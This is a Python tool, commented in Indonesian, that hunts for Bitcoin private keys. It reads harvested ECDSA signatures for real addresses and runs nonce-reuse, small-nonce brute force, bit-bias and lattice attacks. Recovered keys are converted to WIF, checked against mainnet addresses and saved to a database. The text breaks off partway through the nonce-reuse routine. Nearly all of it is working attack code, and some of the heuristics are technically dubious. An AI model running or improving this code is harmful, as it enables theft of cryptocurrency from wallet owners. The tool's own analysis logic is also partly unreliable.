#!/usr/bin/env python3
"""
Bitcoin Private Key Finder - Enhanced Version with Biased/Weak Nonce Attacks
Menambahkan: MSB/LSB 0, k dalam range sempit, dan Lattice Attack (HNP)
"""

import sqlite3
import json
import hashlib
import base58
import ecdsa
from ecdsa import SECP256k1, SigningKey, VerifyingKey
from typing import List, Optional, Dict, Tuple, Set, Any
from dataclasses import dataclass
import sys
import math
import time
from datetime import datetime
import struct
import random
from collections import Counter
import statistics
from decimal import Decimal, getcontext

# Import untuk lattice attack (jika tersedia)
try:
    import numpy as np
    from scipy import linalg
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False

# Import untuk HNP lattice attack
try:
    from fpylll import IntegerMatrix, LLL
    FPYLLL_AVAILABLE = True
except ImportError:
    FPYLLL_AVAILABLE = False

# Konstanta kurva SECP256k1
N = SECP256k1.order
CURVE_ORDER = N
HALF_N = N // 2

# Setup precision untuk perhitungan desimal
getcontext().prec = 100

# ========== STRUCTS DAN CLASSES ==========
@dataclass
class Signature:
    """Struktur data untuk signature"""
    id: int
    address: str
    txid: str
    input_index: int
    sig_index: int
    r: int
    s: int
    z: int
    sighash_type: int
    sig_hex: str
    timestamp: int

@dataclass 
class KeyResult:
    """Hasil recovery private key"""
    address: str
    private_key: int
    wif: str
    method: str
    txid1: str = ""
    txid2: str = ""
    confidence: float = 0.0
    details: str = ""

@dataclass
class BiasAnalysis:
    """Hasil analisis bias pada nonce"""
    address: str
    signature_count: int
    msb_zero_patterns: List[int]  # MSB yang sering 0
    lsb_zero_patterns: List[int]  # LSB yang sering 0
    small_k_detected: bool
    k_range_estimate: Tuple[int, int]
    bias_score: float
    recommendations: List[str]

# ========== RIPEMD160 IMPLEMENTATION (FIXED) ==========
class RIPEMD160Hash:
    """Complete RIPEMD-160 implementation"""
    
    # Initial hash values
    h0 = 0x67452301
    h1 = 0xEFCDAB89
    h2 = 0x98BADCFE
    h3 = 0x10325476
    h4 = 0xC3D2E1F0
    
    @staticmethod
    def left_rotate(x, n):
        """Rotate left 32-bit integer"""
        return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF
    
    @classmethod
    def hash(cls, data: bytes) -> bytes:
        """Calculate RIPEMD-160 hash of data"""
        # Initialize variables
        h0, h1, h2, h3, h4 = cls.h0, cls.h1, cls.h2, cls.h3, cls.h4
        
        # Pre-processing: padding
        original_bit_len = len(data) * 8
        data = bytearray(data)
        
        # Add 0x80 byte
        data.append(0x80)
        
        # Pad with zeros until length % 64 == 56
        while len(data) % 64 != 56:
            data.append(0)
        
        # Append original length in bits as 64-bit little-endian
        data += struct.pack('<Q', original_bit_len)
        
        # Process the message in 64-byte chunks
        for chunk_offset in range(0, len(data), 64):
            chunk = data[chunk_offset:chunk_offset + 64]
            
            # Break chunk into sixteen 32-bit little-endian words
            X = [struct.unpack('<I', chunk[i:i+4])[0] for i in range(0, 64, 4)]
            
            # Initialize working variables
            a = aa = h0
            b = bb = h1
            c = cc = h2
            d = dd = h3
            e = ee = h4
            
            # Round 1
            for j in range(16):
                k = j
                s = [11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8][j]
                r = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15][j]
                
                a = (a + (b ^ c ^ d) + X[r]) & 0xFFFFFFFF
                a = cls.left_rotate(a, s) + e
                a &= 0xFFFFFFFF
                a, b, c, d, e = e, a, cls.left_rotate(b, 10), c, d
            
            # Round 2
            for j in range(16):
                k = 0x5A827999
                s = [7, 6, 8, 13, 11, 9, 7, 15, 7, 12, 15, 9, 11, 7, 13, 12][j]
                r = [7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8][j]
                
                a = (a + ((b & c) | ((~b) & d)) + X[r] + k) & 0xFFFFFFFF
                a = cls.left_rotate(a, s) + e
                a &= 0xFFFFFFFF
                a, b, c, d, e = e, a, cls.left_rotate(b, 10), c, d
            
            # Round 3
            for j in range(16):
                k = 0x6ED9EBA1
                s = [3, 10, 14, 4, 9, 15, 8, 1, 2, 7, 0, 6, 13, 11, 5, 12][j]
                r = [3, 10, 14, 4, 9, 15, 8, 1, 2, 7, 0, 6, 13, 11, 5, 12][j]
                
                a = (a + ((b | (~c)) ^ d) + X[r] + k) & 0xFFFFFFFF
                a = cls.left_rotate(a, s) + e
                a &= 0xFFFFFFFF
                a, b, c, d, e = e, a, cls.left_rotate(b, 10), c, d
            
            # Round 4
            for j in range(16):
                k = 0x8F1BBCDC
                s = [1, 9, 11, 10, 8, 15, 6, 13, 12, 7, 5, 14, 2, 3, 15, 14][j]
                r = [1, 9, 11, 10, 8, 15, 6, 13, 12, 7, 5, 14, 2, 3, 15, 14][j]
                
                a = (a + ((b & d) | (c & (~d))) + X[r] + k) & 0xFFFFFFFF
                a = cls.left_rotate(a, s) + e
                a &= 0xFFFFFFFF
                a, b, c, d, e = e, a, cls.left_rotate(b, 10), c, d
            
            # Round 5
            for j in range(16):
                k = 0xA953FD4E
                s = [4, 11, 15, 5, 14, 7, 6, 9, 13, 15, 7, 12, 8, 9, 11, 10][j]
                r = [4, 11, 15, 5, 14, 7, 6, 9, 13, 15, 7, 12, 8, 9, 11, 10][j]
                
                a = (a + (b ^ (c | (~d))) + X[r] + k) & 0xFFFFFFFF
                a = cls.left_rotate(a, s) + e
                a &= 0xFFFFFFFF
                a, b, c, d, e = e, a, cls.left_rotate(b, 10), c, d
            
            # Right lane
            # Round 1 (right)
            for j in range(16):
                k = 0x50A28BE6
                s = [8, 9, 9, 11, 13, 15, 15, 5, 7, 7, 8, 11, 14, 14, 12, 6][j]
                r = [5, 14, 7, 0, 9, 2, 11, 4, 13, 6, 15, 8, 1, 10, 3, 12][j]
                
                aa = (aa + (bb ^ cc ^ dd) + X[r]) & 0xFFFFFFFF
                aa = cls.left_rotate(aa, s) + ee
                aa &= 0xFFFFFFFF
                aa, bb, cc, dd, ee = ee, aa, cls.left_rotate(bb, 10), cc, dd
            
            # Round 2 (right)
            for j in range(16):
                k = 0x5C4DD124
                s = [9, 13, 15, 7, 12, 8, 9, 11, 7, 7, 12, 7, 6, 15, 13, 11][j]
                r = [6, 11, 3, 7, 0, 13, 5, 10, 14, 15, 8, 12, 4, 9, 1, 2][j]
                
                aa = (aa + ((bb & cc) | ((~bb) & dd)) + X[r] + k) & 0xFFFFFFFF
                aa = cls.left_rotate(aa, s) + ee
                aa &= 0xFFFFFFFF
                aa, bb, cc, dd, ee = ee, aa, cls.left_rotate(bb, 10), cc, dd
            
            # Round 3 (right)
            for j in range(16):
                k = 0x6D703EF3
                s = [11, 13, 6, 7, 14, 9, 13, 15, 14, 8, 13, 6, 5, 12, 7, 5][j]
                r = [15, 5, 1, 3, 7, 14, 6, 9, 11, 8, 12, 2, 10, 0, 4, 13][j]
                
                aa = (aa + ((bb | (~cc)) ^ dd) + X[r] + k) & 0xFFFFFFFF
                aa = cls.left_rotate(aa, s) + ee
                aa &= 0xFFFFFFFF
                aa, bb, cc, dd, ee = ee, aa, cls.left_rotate(bb, 10), cc, dd
            
            # Round 4 (right)
            for j in range(16):
                k = 0x7A6D76E9
                s = [8, 5, 12, 9, 12, 5, 14, 6, 8, 13, 6, 5, 15, 13, 11, 11][j]
                r = [8, 6, 4, 1, 3, 11, 15, 0, 5, 12, 2, 13, 9, 7, 10, 14][j]
                
                aa = (aa + ((bb & dd) | (cc & (~dd))) + X[r] + k) & 0xFFFFFFFF
                aa = cls.left_rotate(aa, s) + ee
                aa &= 0xFFFFFFFF
                aa, bb, cc, dd, ee = ee, aa, cls.left_rotate(bb, 10), cc, dd
            
            # Round 5 (right)
            for j in range(16):
                k = 0x00000000
                s = [9, 7, 15, 11, 8, 6, 6, 14, 12, 13, 5, 14, 13, 13, 7, 5][j]
                r = [1, 9, 11, 10, 0, 8, 12, 4, 13, 3, 7, 15, 14, 5, 6, 2][j]
                
                aa = (aa + (bb ^ (cc | (~dd))) + X[r] + k) & 0xFFFFFFFF
                aa = cls.left_rotate(aa, s) + ee
                aa &= 0xFFFFFFFF
                aa, bb, cc, dd, ee = ee, aa, cls.left_rotate(bb, 10), cc, dd
            
            # Combine results
            t = (h1 + c + dd) & 0xFFFFFFFF
            h1 = (h2 + d + ee) & 0xFFFFFFFF
            h2 = (h3 + e + aa) & 0xFFFFFFFF
            h3 = (h4 + a + bb) & 0xFFFFFFFF
            h4 = (h0 + b + cc) & 0xFFFFFFFF
            h0 = t
        
        # Produce final hash value
        return struct.pack('<IIIII', h0, h1, h2, h3, h4)

def ripemd160(data: bytes) -> bytes:
    """Get RIPEMD-160 hash, trying multiple methods"""
    # Try hashlib first
    try:
        h = hashlib.new('ripemd160')
        h.update(data)
        return h.digest()
    except ValueError:
        # Fallback to our implementation
        return RIPEMD160Hash.hash(data)

# ========== ADDRESS GENERATION UTILITIES ==========
def hash160(data: bytes) -> bytes:
    """SHA256 followed by RIPEMD160"""
    return ripemd160(hashlib.sha256(data).digest())

def pubkey_to_address(pubkey: bytes, compressed: bool = True) -> str:
    """Convert public key to Bitcoin address (P2PKH)"""
    # Get hash160 of public key
    if compressed:
        # Ensure compressed format (33 bytes: 0x02 or 0x03 + 32 bytes)
        if len(pubkey) == 65:  # Uncompressed
            # Compress: use y parity
            x = pubkey[1:33]
            y = int.from_bytes(pubkey[33:], 'big')
            prefix = b'\x02' if y % 2 == 0 else b'\x03'
            pubkey = prefix + x
    else:
        # Uncompressed format
        if len(pubkey) == 33:  # Compressed
            # Decompress (we'll handle this later if needed)
            pass
    
    h160 = hash160(pubkey)
    
    # Mainnet P2PKH address
    version = b'\x00'
    payload = version + h160
    
    # Double SHA256 checksum
    checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    
    # Base58 encode
    return base58.b58encode(payload + checksum).decode('utf-8')

# ========== DATABASE MANAGER (FIXED) ==========
class DatabaseManager:
    """Mengelola database signature dari reno.py"""
    
    def __init__(self, db_path: str = "valid_nonce_reuse.db"):
        self.db_path = db_path
        self.conn = None
        
    def connect(self) -> bool:
        """Koneksi ke database"""
        try:
            self.conn = sqlite3.connect(self.db_path)
            self.conn.row_factory = sqlite3.Row
            return True
        except Exception as e:
            print(f"[!] Error connecting to database: {e}")
            return False
            
    def get_signatures_by_address(self, address: str) -> List[Signature]:
        """Ambil semua signature untuk address tertentu"""
        if not self.conn and not self.connect():
            return []
                
        cursor = self.conn.cursor()
        cursor.execute("""
            SELECT id, address, txid, input_index, sig_index, 
                   r, s, z, sighash_type, sig_hex, timestamp
            FROM signatures 
            WHERE address = ?
            ORDER BY timestamp
        """, (address,))
        
        signatures = []
        for row in cursor.fetchall():
            try:
                # Pastikan semua field ada
                z_value = int(row['z']) if row['z'] and row['z'].strip() else 0
                if z_value == 0:
                    continue  # Skip jika z tidak valid
                    
                sig = Signature(
                    id=row['id'],
                    address=row['address'],
                    txid=row['txid'],
                    input_index=row['input_index'],
                    sig_index=row['sig_index'],
                    r=int(row['r']),
                    s=int(row['s']),
                    z=z_value,
                    sighash_type=row['sighash_type'],
                    sig_hex=row['sig_hex'],
                    timestamp=row['timestamp']
                )
                signatures.append(sig)
            except (ValueError, TypeError, KeyError) as e:
                print(f"[!] Error parsing signature {row.get('id', 'unknown')}: {e}")
                continue
                
        return signatures
    
    def get_signature_pairs_by_r(self, address: str) -> Dict[int, List[Signature]]:
        """Ambil signature yang dikelompokkan berdasarkan nilai r (nonce)"""
        signatures = self.get_signatures_by_address(address)
        r_groups = {}
        
        for sig in signatures:
            if sig.r not in r_groups:
                r_groups[sig.r] = []
            r_groups[sig.r].append(sig)
            
        return r_groups
    
    def get_all_addresses(self) -> List[str]:
        """Dapatkan semua address unik dari database"""
        if not self.conn and not self.connect():
            return []
                
        cursor = self.conn.cursor()
        cursor.execute("SELECT DISTINCT address FROM signatures")
        return [row[0] for row in cursor.fetchall()]
    
    def get_addresses_with_multiple_sigs(self, min_sigs: int = 2) -> List[Tuple[str, int]]:
        """Dapatkan address dengan minimal jumlah signature tertentu"""
        if not self.conn and not self.connect():
            return []
                
        cursor = self.conn.cursor()
        cursor.execute("""
            SELECT address, COUNT(*) as sig_count 
            FROM signatures 
            GROUP BY address 
            HAVING sig_count >= ?
            ORDER BY sig_count DESC
        """, (min_sigs,))
        
        return [(row[0], row[1]) for row in cursor.fetchall()]
    
    def save_recovered_key(self, result: KeyResult) -> bool:
        """Simpan private key yang ditemukan ke database"""
        try:
            if not self.conn and not self.connect():
                return False
                
            cursor = self.conn.cursor()
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS recovered_keys (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    address TEXT,
                    private_key_hex TEXT,
                    wif TEXT,
                    recovery_method TEXT,
                    txid1 TEXT,
                    txid2 TEXT,
                    confidence REAL,
                    timestamp INTEGER,
                    verified INTEGER DEFAULT 0
                )
            """)
            
            # Cek apakah key sudah ada
            cursor.execute("SELECT COUNT(*) FROM recovered_keys WHERE address = ?", (result.address,))
            if cursor.fetchone()[0] == 0:
                cursor.execute("""
                    INSERT INTO recovered_keys 
                    (address, private_key_hex, wif, recovery_method, txid1, txid2, confidence, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    result.address,
                    hex(result.private_key),
                    result.wif,
                    result.method,
                    result.txid1,
                    result.txid2,
                    result.confidence,
                    int(time.time())
                ))
                
                self.conn.commit()
                print(f"[+] Private key saved to database for address {result.address}")
                return True
            else:
                print(f"[*] Private key already exists for address {result.address}")
                return False
                
        except Exception as e:
            print(f"[!] Error saving private key: {e}")
            return False

# ========== ADVANCED BIASED NONCE ATTACKS ==========
class BiasedNonceAnalyzer:
    """Analisis bias pada nonce (k) dalam signature ECDSA"""
    
    def __init__(self, n: int = N):
        self.n = n
        self.n_bits = n.bit_length()
        
    def analyze_msb_bias(self, signatures: List[Signature], threshold: float = 0.7) -> List[int]:
        """
        Analisis bias pada Most Significant Bits (MSB)
        Mengembalikan list bit positions di mana 0 muncul > threshold%
        """
        if len(signatures) < 10:
            return []
        
        # Kumpulkan nilai r (nonce terkait)
        r_values = [sig.r for sig in signatures]
        
        msb_counts = {bit: 0 for bit in range(self.n_bits)}
        
        for r in r_values:
            for bit in range(self.n_bits):
                if (r >> (self.n_bits - 1 - bit)) & 1 == 0:  # MSB dari kiri
                    msb_counts[bit] += 1
        
        # Identifikasi bias
        biased_bits = []
        total_sigs = len(r_values)
        
        for bit, count in msb_counts.items():
            if count / total_sigs > threshold:
                biased_bits.append(bit)
        
        return biased_bits
    
    def analyze_lsb_bias(self, signatures: List[Signature], threshold: float = 0.7) -> List[int]:
        """
        Analisis bias pada Least Significant Bits (LSB)
        Mengembalikan list bit positions di mana 0 muncul > threshold%
        """
        if len(signatures) < 10:
            return []
        
        r_values = [sig.r for sig in signatures]
        lsb_counts = {bit: 0 for bit in range(32)}  # Periksa 32 LSB pertama
        
        for r in r_values:
            for bit in range(32):
                if (r >> bit) & 1 == 0:
                    lsb_counts[bit] += 1
        
        biased_bits = []
        total_sigs = len(r_values)
        
        for bit, count in lsb_counts.items():
            if count / total_sigs > threshold:
                biased_bits.append(bit)
        
        return biased_bits
    
    def estimate_k_range(self, signatures: List[Signature]) -> Tuple[int, int]:
        """
        Estimasi range k berdasarkan nilai r
        Menggunakan fakta: r = (k*G).x mod n
        """
        if len(signatures) < 5:
            return (0, self.n)
        
        r_values = [sig.r for sig in signatures]
        sorted_r = sorted(r_values)
        
        # Estimasi sederhana: asumsikan k dalam range kecil jika r terkonsentrasi
        if len(sorted_r) >= 10:
            # Gunakan percentiles
            p10 = sorted_r[len(sorted_r)//10]
            p90 = sorted_r[len(sorted_r)*9//10]
            
            # Konversi ke estimasi k range (heuristik)
            if p90 - p10 < self.n // 1000:  # Range sangat kecil
                return (p10, p90)
        
        return (0, self.n)
    
    def detect_small_k(self, signatures: List[Signature], max_k: int = 2**16) -> bool:
        """
        Deteksi apakah k kemungkinan kecil (< max_k)
        """
        if len(signatures) < 3:
            return False
        
        # Heuristik: jika r kecil, k mungkin kecil
        small_r_count = sum(1 for sig in signatures if sig.r < max_k)
        
        return small_r_count / len(signatures) > 0.3
    
    def analyze_signatures(self, address: str, signatures: List[Signature]) -> BiasAnalysis:
        """Analisis komprehensif bias nonce untuk suatu address"""
        
        if len(signatures) < 5:
            return BiasAnalysis(
                address=address,
                signature_count=len(signatures),
                msb_zero_patterns=[],
                lsb_zero_patterns=[],
                small_k_detected=False,
                k_range_estimate=(0, self.n),
                bias_score=0.0,
                recommendations=["Collect more signatures for analysis"]
            )
        
        # Analisis berbagai jenis bias
        msb_bias = self.analyze_msb_bias(signatures, threshold=0.65)
        lsb_bias = self.analyze_lsb_bias(signatures, threshold=0.65)
        small_k = self.detect_small_k(signatures)
        k_range = self.estimate_k_range(signatures)
        
        # Hitung bias score
        bias_score = 0.0
        recommendations = []
        
        if msb_bias:
            bias_score += 0.3
            recommendations.append(f"MSB bias detected at positions: {msb_bias}")
        
        if lsb_bias:
            bias_score += 0.3
            recommendations.append(f"LSB bias detected at positions: {lsb_bias}")
        
        if small_k:
            bias_score += 0.2
            recommendations.append("Small k values detected")
        
        if k_range[1] - k_range[0] < self.n // 100:
            bias_score += 0.2
            recommendations.append(f"k likely in narrow range: {hex(k_range[0])[:10]}... to {hex(k_range[1])[:10]}...")
        
        if not recommendations:
            recommendations.append("No strong bias patterns detected")
        
        return BiasAnalysis(
            address=address,
            signature_count=len(signatures),
            msb_zero_patterns=msb_bias,
            lsb_zero_patterns=lsb_bias,
            small_k_detected=small_k,
            k_range_estimate=k_range,
            bias_score=bias_score,
            recommendations=recommendations
        )

class LatticeAttack:
    """Implementasi Lattice Attack untuk Hidden Number Problem (HNP)"""
    
    def __init__(self, n: int = N, m: int = None):
        self.n = n
        self.n_bits = n.bit_length()
        self.m = m if m else self.n_bits // 2  # Jumlah bit yang diketahui
    
    def build_lattice_hnp(self, signatures: List[Signature], known_bits: int = 8) -> Optional[Any]:
        """
        Bangun lattice untuk Hidden Number Problem
        known_bits: jumlah LSB dari k yang diketahui (asumsi = 0)
        """
        if len(signatures) < 5:
            return None
        
        if not NUMPY_AVAILABLE:
            print("    [!] NumPy not available for lattice attack")
            return None
        
        # Sederhanakan: gunakan pendekatan LLL sederhana
        t = len(signatures)
        
        # Matriks basis lattice
        # Dimensi: (t+1) x (t+1)
        lattice = np.zeros((t+1, t+1), dtype=object)
        
        # Isi diagonal dengan n
        for i in range(t):
            lattice[i, i] = self.n
        
        # Baris terakhir: koefisien dari u_i = r_i * s_i^-1
        for i in range(t):
            sig = signatures[i]
            s_inv = pow(sig.s, self.n - 2, self.n)
            u_i = (sig.r * s_inv) % self.n
            lattice[t, i] = u_i
        
        # Kolom terakhir: 2^known_bits / n (untuk scaling)
        lattice[t, t] = 2**known_bits / self.n
        
        return lattice
    
    def babai_nearest_plane(self, lattice: Any, target: List[int]) -> List[int]:
        """
        Babai's Nearest Plane Algorithm untuk menyelesaikan CVP
        """
        if not NUMPY_AVAILABLE:
            return []
        
        try:
            # LLL reduction
            Q, R = np.linalg.qr(lattice)
            
            # Rounding coefficients
            coefficients = np.linalg.solve(R, target)
            rounded = np.round(coefficients)
            
            # Reconstruct solution
            solution = np.dot(lattice, rounded)
            return solution.tolist()
        except:
            return []
    
    def recover_key_from_lattice(self, signatures: List[Signature], known_bits: int = 8) -> Optional[int]:
        """
        Coba recover private key menggunakan lattice attack
        """
        if len(signatures) < 8:
            return None
        
        print(f"    [Lattice] Attempting HNP attack with {len(signatures)} signatures, {known_bits} known bits")
        
        # Pendekatan sederhana: jika kita asumsikan LSB k = 0,
        # kita dapat membentuk sistem persamaan linear
        
        # Persamaan: k_i = (z_i + r_i*d) * s_i^-1 mod n
        # Jika LSB(k_i) = 0, maka k_i = 2 * k_i'
        # Maka: 2*k_i' = (z_i + r_i*d) * s_i^-1 mod n
        
        # Kumpulkan persamaan untuk beberapa signature
        equations = []
        
        for sig in signatures[:20]:  # Batasi jumlah persamaan
            s_inv = pow(sig.s, self.n - 2, self.n)
            r_s_inv = (sig.r * s_inv) % self.n
            z_s_inv = (sig.z * s_inv) % self.n
            
            equations.append((r_s_inv, z_s_inv))
        
        # Coba selesaikan dengan eliminasi
        if len(equations) >= 2:
            # Ambil dua persamaan pertama
            (a1, b1), (a2, b2) = equations[0], equations[1]
            
            # d = (b2 - b1) * (a1 - a2)^-1 mod n, dengan asumsi k' kecil
            try:
                diff_a = (a1 - a2) % self.n
                diff_b = (b2 - b1) % self.n
                
                if diff_a == 0:
                    return None
                
                diff_a_inv = pow(diff_a, self.n - 2, self.n)
                d_candidate = (diff_b * diff_a_inv) % self.n
                
                # Verifikasi dengan persamaan lain
                verified = 0
                for (a, b) in equations[2:6]:
                    k_prime = (a * d_candidate + b) % self.n
                    if k_prime < 2**16:  # Asumsi k' kecil
                        verified += 1
                
                if verified >= 2:
                    return d_candidate
                    
            except Exception as e:
                print(f"    [Lattice] Error in simple HNP: {e}")
        
        # Jika fpylll tersedia, coba lattice attack yang lebih canggih
        if FPYLLL_AVAILABLE and len(signatures) >= 10:
            return self._fpylll_lattice_attack(signatures, known_bits)
        
        return None
    
    def _fpylll_lattice_attack(self, signatures: List[Signature], known_bits: int) -> Optional[int]:
        """
        Lattice attack menggunakan fpylll
        """
        try:
            t = len(signatures)
            
            # Bangun matriks lattice untuk HNP
            # Ukuran matriks: (t+1) x (t+1)
            A = IntegerMatrix(t+1, t+1)
            
            # Isi diagonal dengan 2^known_bits
            for i in range(t):
                A[i, i] = 2**known_bits
            
            # Isi baris terakhir dengan koefisien
            for i in range(t):
                sig = signatures[i]
                s_inv = pow(sig.s, self.n - 2, self.n)
                u_i = (sig.r * s_inv) % self.n
                A[t, i] = u_i
            
            # Isi kolom terakhir dengan n (modulus)
            for i in range(t):
                A[i, t] = self.n
            
            A[t, t] = 1
            
            # LLL reduction
            LLL.reduction(A)
            
            # Ambil vektor terpendek (baris pertama setelah reduction)
            shortest_vector = A[0]
            
            # Coba ekstrak private key dari vektor terpendek
            # d biasanya terkandung dalam komponen terakhir
            if len(shortest_vector) > t:
                d_candidate = abs(shortest_vector[t]) % self.n
                
                # Verifikasi cepat
                if 0 < d_candidate < self.n:
                    # Cek dengan beberapa signature
                    verified = 0
                    for sig in signatures[:3]:
                        s_inv = pow(sig.s, self.n - 2, self.n)
                        k = ((sig.z + sig.r * d_candidate) % self.n) * s_inv % self.n
                        if k & ((1 << known_bits) - 1) == 0:  # Cek LSB
                            verified += 1
                    
                    if verified >= 2:
                        return d_candidate
        
        except Exception as e:
            print(f"    [Lattice] fpylll attack error: {e}")
        
        return None

class StatisticalAttack:
    """Serangan berbasis statistik untuk weak nonce"""
    
    def __init__(self, n: int = N):
        self.n = n
        self.analyzer = BiasedNonceAnalyzer(n)
    
    def brute_force_small_k(self, signatures: List[Signature], max_k: int = 2**20) -> Optional[int]:
        """
        Brute force untuk k kecil (dibawah max_k)
        """
        if len(signatures) < 2:
            return None
        
        print(f"    [Statistical] Brute forcing k up to {max_k:,}...")
        
        # Gunakan signature pertama untuk generate candidate
        sig1 = signatures[0]
        
        for k_candidate in range(1, max_k + 1):
            try:
                # d = (s*k - z) * r^-1 mod n
                r_inv = pow(sig1.r, self.n - 2, self.n)
                d_candidate = ((sig1.s * k_candidate - sig1.z) % self.n) * r_inv % self.n
                
                # Verifikasi dengan signature lain
                verified = 0
                for sig in signatures[1:5]:  # Coba verifikasi dengan 4 signature
                    k_test = self.recover_k(sig, d_candidate)
                    if k_test == k_candidate:
                        verified += 1
                
                if verified >= 2:
                    print(f"    [Statistical] Found k={k_candidate} with {verified} verifications")
                    return d_candidate
                    
            except:
                continue
        
        return None
    
    def recover_k(self, sig: Signature, d: int) -> Optional[int]:
        """Recover k dari signature dan private key"""
        try:
            s_inv = pow(sig.s, self.n - 2, self.n)
            k = ((sig.z + sig.r * d) % self.n) * s_inv % self.n
            return k
        except:
            return None
    
    def msb_zero_attack(self, signatures: List[Signature], msb_zero_bits: List[int]) -> Optional[int]:
        """
        Exploit MSB zero bias
        """
        if not msb_zero_bits or len(signatures) < 3:
            return None
        
        print(f"    [Statistical] MSB zero attack for bits: {msb_zero_bits}")
        
        # Coba untuk setiap kombinasi MSB zero
        for msb_bit in msb_zero_bits[:3]:  # Coba 3 bits pertama
            mask = (1 << (self.analyzer.n_bits - msb_bit)) - 1
            
            # Kumpulkan signature dengan r yang memiliki MSB zero di posisi tersebut
            filtered_sigs = []
            for sig in signatures:
                if (sig.r >> (self.analyzer.n_bits - 1 - msb_bit)) & 1 == 0:
                    filtered_sigs.append(sig)
            
            if len(filtered_sigs) >= 2:
                # Coba nonce reuse pada filtered signatures
                for i in range(len(filtered_sigs)):
                    for j in range(i+1, len(filtered_sigs)):
                        sig1, sig2 = filtered_sigs[i], filtered_sigs[j]
                        
                        if sig1.r == sig2.r:
                            # Nonce reuse biasa
                            continue
                        
                        # Coba selesaikan dengan asumsi k memiliki pola tertentu
                        try:
                            # d = (z1*s2 - z2*s1) / (r*(s1 - s2)) mod n
                            s_diff = (sig1.s - sig2.s) % self.n
                            if s_diff == 0:
                                continue
                            
                            numerator = (sig1.z * sig2.s - sig2.z * sig1.s) % self.n
                            denominator = (sig1.r * s_diff) % self.n
                            denom_inv = pow(denominator, self.n - 2, self.n)
                            
                            d_candidate = (numerator * denom_inv) % self.n
                            
                            # Verifikasi
                            if 0 < d_candidate < self.n:
                                # Cek dengan beberapa signature
                                verified = 0
                                for sig in signatures[:5]:
                                    k = self.recover_k(sig, d_candidate)
                                    if k and (k >> (self.analyzer.n_bits - 1 - msb_bit)) & 1 == 0:
                                        verified += 1
                                
                                if verified >= 3:
                                    return d_candidate
                                    
                        except:
                            continue
        
        return None
    
    def lsb_zero_attack(self, signatures: List[Signature], lsb_zero_bits: List[int]) -> Optional[int]:
        """
        Exploit LSB zero bias
        """
        if not lsb_zero_bits or len(signatures) < 3:
            return None
        
        print(f"    [Statistical] LSB zero attack for bits: {lsb_zero_bits}")
        
        for lsb_bit in lsb_zero_bits[:3]:  # Coba 3 bits pertama
            # k harus habis dibagi 2^lsb_bit
            divisor = 1 << lsb_bit
            
            # Coba semua k' kecil
            max_k_prime = 2**16 // divisor
            
            for k_prime in range(1, max_k_prime + 1):
                k_candidate = divisor * k_prime
                
                # Hitung d dari signature pertama
                sig1 = signatures[0]
                try:
                    r_inv = pow(sig1.r, self.n - 2, self.n)
                    d_candidate = ((sig1.s * k_candidate - sig1.z) % self.n) * r_inv % self.n
                    
                    # Verifikasi dengan signature lain
                    verified = 0
                    for sig in signatures[1:5]:
                        k_test = self.recover_k(sig, d_candidate)
                        if k_test == k_candidate:
                            verified += 1
                    
                    if verified >= 2:
                        print(f"    [Statistical] Found with k={k_candidate} (k'={k_prime})")
                        return d_candidate
                        
                except:
                    continue
        
        return None
    
    def narrow_range_attack(self, signatures: List[Signature], k_range: Tuple[int, int]) -> Optional[int]:
        """
        Exploit k dalam range sempit
        """
        k_min, k_max = k_range
        
        if k_max - k_min > 10000:  # Range terlalu besar
            return None
        
        print(f"    [Statistical] Narrow range attack: k in [{k_min}, {k_max}]")
        
        # Brute force dalam range
        for k_candidate in range(k_min, min(k_max + 1, k_min + 10000)):
            sig1 = signatures[0]
            try:
                r_inv = pow(sig1.r, self.n - 2, self.n)
                d_candidate = ((sig1.s * k_candidate - sig1.z) % self.n) * r_inv % self.n
                
                # Verifikasi dengan signature lain
                verified = 0
                for sig in signatures[1:5]:
                    k_test = self.recover_k(sig, d_candidate)
                    if k_test == k_candidate:
                        verified += 1
                
                if verified >= 2:
                    print(f"    [Statistical] Found k={k_candidate} in narrow range")
                    return d_candidate
                    
            except:
                continue
        
        return None

# ========== ECDSA ATTACK CLASS (ENHANCED) ==========
class ECDSAAttackEnhanced:
    """Kelas enhanced untuk melakukan berbagai serangan ECDSA termasuk biased nonce"""
    
    def __init__(self, n: int = N):
        self.n = n
        self.analyzer = BiasedNonceAnalyzer(n)
        self.lattice_attack = LatticeAttack(n)
        self.stat_attack = StatisticalAttack(n)
        
    def int_to_wif(self, private_key: int, compressed: bool = True) -> str:
        """Konversi private key integer ke format WIF"""
        try:
            prefix = b'\x80'
            pk_bytes = private_key.to_bytes(32, 'big')
            suffix = b'\x01' if compressed else b''
            data = prefix + pk_bytes + suffix
            checksum = hashlib.sha256(hashlib.sha256(data).digest()).digest()[:4]
            wif = base58.b58encode(data + checksum).decode('utf-8')
            return wif
        except Exception as e:
            print(f"[!] Error converting to WIF: {e}")
            return ""
    
    def verify_private_key(self, private_key: int, address: str) -> Tuple[bool, str]:
        """Verifikasi private key dengan menghasilkan address dan public key"""
        try:
            if not (1 <= private_key < self.n):
                return False, "Private key out of range"
            
            sk = SigningKey.from_secret_exponent(private_key, curve=SECP256k1)
            vk = sk.get_verifying_key()
            
            # Compressed
            public_key_compressed = vk.to_string("compressed")
            generated_address = pubkey_to_address(public_key_compressed, compressed=True)
            
            if generated_address == address:
                return True, f"Verified. Public key (compressed): {public_key_compressed.hex()}"
            
            # Uncompressed
            public_key_uncompressed = vk.to_string("uncompressed")
            generated_address_uncompressed = pubkey_to_address(public_key_uncompressed, compressed=False)
            
            if generated_address_uncompressed == address:
                return True, f"Verified (uncompressed). Public key: {public_key_uncompressed.hex()}"
            
            return False, f"Address mismatch. Generated: {generated_address}, Expected: {address}"
            
        except Exception as e:
            return False, f"Verification error: {str(e)}"
    
    def recover_private_key_from_nonce_reuse(self, sig1: Signature, sig2: Signature) -> Optional[int]:
        """Recover private key ketika NONCE SAMA (r sama)"""
        if sig1.r != sig2.r:
            return None
            
        r = sig1.r
        s1 = sig1.s % self.n
        s2 = sig2.s % self.n
